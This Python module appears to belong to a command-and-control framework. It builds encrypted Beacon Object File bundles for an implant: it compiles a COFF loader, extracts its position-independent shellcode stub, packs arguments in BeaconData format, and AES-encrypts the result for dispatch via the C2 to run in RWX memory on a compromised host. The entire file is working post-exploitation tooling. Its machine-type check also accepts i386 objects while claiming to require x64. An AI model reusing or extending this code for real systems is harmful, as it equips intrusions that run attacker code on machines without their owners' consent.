# bab/bof.py — BOF (Beacon Object File) bundle packer
#
# BOF bundle format (AES-256-CBC encrypted at rest, decrypted by implant):
#
#   Cleartext bundle in RWX memory:
#   [0..4]   "BCOF" magic
#   [4..8]   entry_offset: u32 LE  — offset from bundle[0] to loader stub
#   [8..12]  coff_offset:  u32 LE  — offset from bundle[0] to COFF .o bytes
#   [12..16] coff_size:    u32 LE
#   [16..20] args_offset:  u32 LE  — offset from bundle[0] to packed args
#   [20..24] args_size:    u32 LE
#   [24..32] output_ptr:   u64 LE  — written by loader after go() returns
#   [32..36] output_size:  u32 LE  — written by loader after go() returns
#   [36..40] reserved:     u32
#   [40..]   coff_loader stub (position-independent shellcode)
#   [coff_offset..] raw COFF .o bytes
#   [args_offset..] BeaconData-packed arguments
#
# Argument packing (BeaconData wire format):
#   int    → 4 bytes little-endian
#   short  → 2 bytes little-endian
#   str    → u32 big-endian length + UTF-8 bytes + \0
#   wstr   → u32 big-endian length + UTF-16LE bytes + \0\0
#   bin    → u32 big-endian length + raw bytes

import os
import struct
from pathlib import Path

from .config import ROOT
from .ui     import section, ok, err, info
from .cargo  import run_cmd, CARGO_ENV, _find_cargo
from .loader import _extract_pe_text_section  # reuse PE section extractor

# ── Paths ─────────────────────────────────────────────────────────────────────
LOADER_DIR   = ROOT / "tools" / "coff_loader"
LOADER_EXE   = LOADER_DIR / "target" / "x86_64-pc-windows-gnu" / "release" / "coff_loader.exe"
CACHED_STUB  = ROOT / "tools" / "coff_loader_stub.bin"

HEADER_SIZE  = 40  # entry_offset is always 40

# ── Compilation ───────────────────────────────────────────────────────────────
def compile_coff_loader() -> bool:
    """Build the coff_loader Rust crate and produce coff_loader.exe."""
    section("Compile COFF loader stub")
    if not LOADER_DIR.exists():
        err(f"coff_loader source not found: {LOADER_DIR}")
        return False
    try:
        cargo = _find_cargo()
    except FileNotFoundError as e:
        err(str(e))
        return False
    cmd = [cargo, "build", "--release", "--target=x86_64-pc-windows-gnu"]
    if not run_cmd(cmd, cwd=LOADER_DIR, env=CARGO_ENV):
        err("coff_loader compile failed.")
        return False
    if not LOADER_EXE.exists():
        err(f"Expected EXE not found: {LOADER_EXE}")
        return False
    ok(f"coff_loader.exe  ({LOADER_EXE.stat().st_size // 1024} KB)")
    return True

# ── Stub extraction ───────────────────────────────────────────────────────────
def extract_stub() -> bytes | None:
    """Extract position-independent stub from coff_loader.exe."""
    section("Extract COFF loader stub")
    stub = _extract_pe_text_section(LOADER_EXE)
    if stub is None:
        return None
    # Sanity check: entry point must start in .text (any opcode is valid —
    # unlike thornldr we don't require 0xE8 since the entry is a direct call)
    if len(stub) < 16:
        err(f"Stub too small: {len(stub)} bytes")
        return None
    CACHED_STUB.parent.mkdir(parents=True, exist_ok=True)
    CACHED_STUB.write_bytes(stub)
    ok(f"Stub: {len(stub):,} bytes  (cached → tools/coff_loader_stub.bin)")
    return stub

def rebuild_stub() -> bool:
    """Force recompile of the coff_loader stub, bypassing the cache."""
    section("Rebuild COFF loader stub")
    if CACHED_STUB.exists():
        CACHED_STUB.unlink()
        info("Cleared cached coff_loader stub")
    if not compile_coff_loader():
        return False
    stub = extract_stub()
    return stub is not None

def _load_stub() -> bytes | None:
    """Return cached stub, or compile + extract if not present."""
    if CACHED_STUB.exists():
        stub = CACHED_STUB.read_bytes()
        info(f"Using cached coff_loader stub  ({len(stub):,} bytes)")
        return stub
    if not compile_coff_loader():
        return None
    return extract_stub()

# ── Argument packer ───────────────────────────────────────────────────────────
class BofArgs:
    """Pack arguments in BeaconData wire format for a BOF's go() function."""

    def __init__(self):
        self._buf = bytearray()

    def add_int(self, v: int) -> "BofArgs":
        """Pack a 4-byte little-endian integer."""
        self._buf += struct.pack("<i", v)
        return self

    def add_short(self, v: int) -> "BofArgs":
        """Pack a 2-byte little-endian short."""
        self._buf += struct.pack("<h", v)
        return self

    def add_str(self, s: str) -> "BofArgs":
        """Pack a null-terminated UTF-8 string with 4-byte big-endian length."""
        encoded = s.encode("utf-8") + b"\x00"
        self._buf += struct.pack(">I", len(encoded)) + encoded
        return self

    def add_wstr(self, s: str) -> "BofArgs":
        """Pack a null-terminated UTF-16LE string with 4-byte big-endian length."""
        encoded = s.encode("utf-16-le") + b"\x00\x00"
        self._buf += struct.pack(">I", len(encoded)) + encoded
        return self

    def add_bin(self, b: bytes) -> "BofArgs":
        """Pack raw binary data with 4-byte big-endian length."""
        self._buf += struct.pack(">I", len(b)) + b
        return self

    def build(self) -> bytes:
        return bytes(self._buf)


# ── Bundle assembly ───────────────────────────────────────────────────────────
def build_bundle(bof_path: Path, args: BofArgs | None = None) -> bytes | None:
    """
    Build a cleartext BOF bundle ready for AES encryption and dispatch.

    bof_path: path to a compiled COFF .o file
    args:     packed argument builder (or None for no args)

    Returns the raw bundle bytes, or None on error.
    """
    stub = _load_stub()
    if stub is None:
        return None

    coff_bytes = bof_path.read_bytes()
    if coff_bytes[:2] != b"\x4C\x01" and coff_bytes[:2] != b"\x64\x86":
        # Check for COFF x64 machine type (0x8664 LE = b'\x64\x86')
        if len(coff_bytes) < 2 or int.from_bytes(coff_bytes[0:2], "little") != 0x8664:
            err(f"Not an x64 COFF object file: {bof_path}")
            return None

    args_bytes = args.build() if args else b""

    entry_offset = HEADER_SIZE
    coff_offset  = entry_offset + len(stub)
    args_offset  = coff_offset  + len(coff_bytes)

    header = struct.pack(
        "<4sIIIIIQII",
        b"BCOF",
        entry_offset,
        coff_offset,
        len(coff_bytes),
        args_offset,
        len(args_bytes),
        0,   # output_ptr — written by loader at runtime
        0,   # output_size — written by loader at runtime
        0,   # reserved
    )
    assert len(header) == HEADER_SIZE, f"header size mismatch: {len(header)}"

    return header + stub + coff_bytes + args_bytes


def pack_and_encrypt(bof_path: Path, args: BofArgs | None, cfg: dict) -> bytes | None:
    """
    Build bundle, AES-256-CBC encrypt it with the implant key/IV.
    Returns the ciphertext bytes (without base64), ready for the implant.
    """
    import base64
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad

    bundle = build_bundle(bof_path, args)
    if bundle is None:
        return None

    key = cfg["key"].encode()[:32].ljust(32, b"\x00")
    iv  = cfg["iv"].encode()[:16].ljust(16, b"\x00")
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.encrypt(pad(bundle, 16))


# ── CLI helper ────────────────────────────────────────────────────────────────
def do_bof(bof_path_str: str, cfg: dict, extra_args: list[str] | None = None):
    """
    Pack and display a BOF bundle for dispatch via the C2.
    Called from cli/build.py 'build bof <path>'.
    """
    import base64
    bof_path = Path(bof_path_str).expanduser().resolve()
    if not bof_path.exists():
        err(f"BOF file not found: {bof_path}")
        return None

    ciphertext = pack_and_encrypt(bof_path, None, cfg)
    if ciphertext is None:
        return None

    b64 = base64.b64encode(ciphertext).decode()
    ok(f"BOF bundle ready  ({len(ciphertext):,} bytes encrypted)")
    info(f"File: {bof_path.name}")
    return b64
